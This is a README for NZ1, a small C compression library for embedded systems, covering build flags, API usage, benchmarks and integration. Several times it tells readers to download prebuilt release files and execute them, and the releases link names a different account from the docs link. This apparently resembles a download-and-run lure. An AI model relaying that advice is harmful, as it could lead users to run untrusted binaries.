NZ1 — NanoZip: Portable C Compression for Embedded Systems
==========================================================

[![Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github)](https://github.com/Bhushan2222/NZ1/releases) [![Docs](https://img.shields.io/badge/Docs-Full%20Documentation-green)](https://ferki-git-creator.github.io/nz1-site/) [![License](https://img.shields.io/badge/License-BSD%203--Clause-orange)](LICENSE)

![NZ1 banner](https://raw.githubusercontent.com/Bhushan2222/NZ1/main/assets/nz1-banner.png)

About
-----
NZ1 (NanoZip 1) is a small, portable C compression library. It focuses on fast, lossless compression with a tiny code and memory footprint. The code runs on bare metal and common OS targets. It includes optimized code paths for ARM NEON and x86 AVX2 where available. NZ1 uses a variant of LZ77 and CRC32 checksums to provide safe, real-time compression for embedded, game, and IoT systems.

Topics: arm-neon, avx2, c-library, compression, crc32, data-compression, embedded, embedded-systems, fast-compression, game-development, iot, lossless-compression, low-memory, lz-based, lz77, microcontroller, no-dependencies, portable, real-time, simd

Quick links
-----------
- Full docs: https://ferki-git-creator.github.io/nz1-site/
- Releases (download and run the file): https://github.com/Bhushan2222/NZ1/releases

If you want a ready artifact, download the release asset from the releases page and execute it. The release assets contain prebuilt binaries and test tools that you can run directly on your host or target.

Why NZ1
-------
- Small C API that integrates in minutes.
- No external dependencies. Single-file headers and small source files.
- Low memory use. Tunable working buffers.
- Deterministic speed that suits real-time systems.
- SIMD-optimized paths for NEON and AVX2.
- Portable to microcontrollers and POSIX systems.

Features
--------
- LZ77-style dictionary matching with lightweight hash table.
- CRC32 integrity checks.
- Streaming API for incremental compression.
- Single-pass decompressor that uses minimal heap.
- SIMD accelerations: ARM NEON and x86 AVX2.
- Cross-compile friendly. No libc dynamic features required.
- Small footprint: core library < 10 KB compiled for many targets.

Getting started
---------------
Download a release and run the included test tool:

1. Visit the releases page and download the appropriate asset for your platform:
   https://github.com/Bhushan2222/NZ1/releases

2. Extract and run the binary or test script:
   - On Linux:
     ```bash
     tar -xzf nz1-release-linux.tar.gz
     ./nz1-test
     ```
   - On Windows, unpack the ZIP and run the .exe.

3. The test binary exercises compression and decompression and prints basic speed and ratio metrics.

If you plan to embed NZ1 inside firmware, fetch the header and source files and add them to your build. The library compiles with plain gcc or clang and works with cross toolchains.

Build from source
-----------------
Clone and build with a few commands:

```bash
git clone https://github.com/Bhushan2222/NZ1.git
cd NZ1
make            # builds nz1 static lib and test tools
```

Cross-compile example (ARM Cortex-M with arm-none-eabi):
```bash
make CC=arm-none-eabi-gcc CFLAGS="-mcpu=cortex-m4 -mthumb -O3"
```

Configuration flags
-------------------
NZ1 uses preprocessor flags to control builds:

- NZ1_USE_NEON=1 — enable ARM NEON code path
- NZ1_USE_AVX2=1 — enable x86 AVX2 code path
- NZ1_NO_STDLIB=1 — avoid stdlib functions for bare-metal builds
- NZ1_MAX_WINDOW=16384 — set max LZ77 window size
- NZ1_BLOCK_SIZE=4096 — default internal block size

API overview
------------
Basic functions in the public header:

- nz1_compress(const uint8_t* src, size_t src_len, uint8_t* dst, size_t* dst_len, nz1_opts_t* opts)
  - Compress a single buffer. Returns 0 on success.
- nz1_decompress(const uint8_t* src, size_t src_len, uint8_t* dst, size_t* dst_len)
  - Decompress a single buffer.
- nz1_stream_init(nz1_stream_t* s, nz1_opts_t* opts)
- nz1_stream_compress(nz1_stream_t* s, const uint8_t* in, size_t inlen, uint8_t* out, size_t* outlen, int flush)
- nz1_stream_decompress(...)

Example: one-shot compression
```c
#include "nz1.h"

uint8_t outbuf[65536];
size_t outlen = sizeof(outbuf);
if (nz1_compress(inbuf, inlen, outbuf, &outlen, NULL) != 0) {
    /* handle error */
}
/* outbuf[0..outlen-1] now holds compressed data */
```

Example: streaming compress
```c
nz1_stream_t s;
nz1_stream_init(&s, NULL);
while (read_chunk(&chunk, &len)) {
    size_t outcap = 8192, outlen = outcap;
    nz1_stream_compress(&s, chunk, len, outbuf, &outlen, 0);
    write_out(outbuf, outlen);
}
size_t final_out = 8192;
nz1_stream_compress(&s, NULL, 0, outbuf, &final_out, 1);
write_out(outbuf, final_out);
```

Performance and benchmarks
--------------------------
NZ1 targets a high speed-to-memory ratio. Expect low-latency compression and near-peak throughput on modern hardware when AVX2 or NEON is available.

Example metrics (x86-64, AVX2 enabled, O3):
- Compression throughput: 400–800 MB/s
- Decompression throughput: 800–2000 MB/s
- Typical ratio: 1.5–3x depending on input

Embedded constraints
--------------------
- Set NZ1_MAX_WINDOW to match available RAM.
- Use streaming API to avoid large input buffers.
- Turn off dynamic allocations with NZ1_NO_STDLIB on bare metal.
- Provide your own memcpy/memset hooks for small CRTs.

SIMD and portability
--------------------
The library detects SIMD at build time. To enable optimized paths, set flags or let configure script detect CPU features. If the compiler or target does not support SIMD, NZ1 falls back to a plain C path that remains fast and tiny.

- ARM NEON: faster match detection and memcpy-like copy loops.
- AVX2: vectorized literals scanning and match skipping.

Testing
-------
The repo contains unit tests and compression corpus tests. Run tests after build:

```bash
make test
```

Test artifacts include round-trip checks and a small corpus of sample files.

Integrating in projects
-----------------------
- Copy the public header and source into your project.
- Add nz1.c to your build.
- Link with your system startup and C runtime.

CMake example:
```cmake
add_library(nz1 STATIC src/nz1.c)
target_include_directories(nz1 PUBLIC include)
target_compile_definitions(nz1 PUBLIC NZ1_USE_NEON=1)
```

Memory model
------------
NZ1 separates working memory (scratch) from output buffers. You can allocate scratch in static RAM or provide a buffer at init time. Typical scratch sizes range from a few KB to tens of KB.

CRC and data integrity
----------------------
NZ1 embeds CRC32 for each compressed block. The decompressor validates CRC on decode. You can disable CRC to save bytes where integrity is handled by transport.

Use cases
---------
- Real-time audio or game asset streaming.
- Firmware update packages for constrained devices.
- On-device log compression.
- Network message compression for low-bandwidth links.

Artifacts and releases
----------------------
Download the packaged release and run the included test utility or sample binaries. The release contains prebuilt tools and example assets. Download the release file and execute it from the releases page:
https://github.com/Bhushan2222/NZ1/releases

If a release does not match your target, build from source with the steps above.

Contributing
------------
- Fork, implement a clear change, include tests, open a PR.
- Keep patches focused and document any API changes.
- Report reproducible issues and attach small test cases.

Style and license
-----------------
- Code stays in plain C (C99 compatible).
- The project uses a permissive BSD 3-clause license. See LICENSE file.

Resources
---------
- Full docs: https://ferki-git-creator.github.io/nz1-site/
- Releases (download and run): https://github.com/Bhushan2222/NZ1/releases
- Compression topics: LZ77, CRC32, SIMD optimizations

Badges & ecosystem
------------------
[![ARM NEON](https://img.shields.io/badge/ARM-NEON-lightgrey)]() [![AVX2](https://img.shields.io/badge/x86-AVX2-lightgrey)]() [![Tiny](https://img.shields.io/badge/Size-Small-brightgreen)]()

Images
------
- C logo: ![C Logo](https://upload.wikimedia.org/wikipedia/commons/1/18/C_gcc_logo.png)
- SIMD illustration: ![SIMD](https://upload.wikimedia.org/wikipedia/commons/2/2b/SIMD_logo.svg)

Changelog
---------
See CHANGELOG.md in the repo for a full history of releases and changes.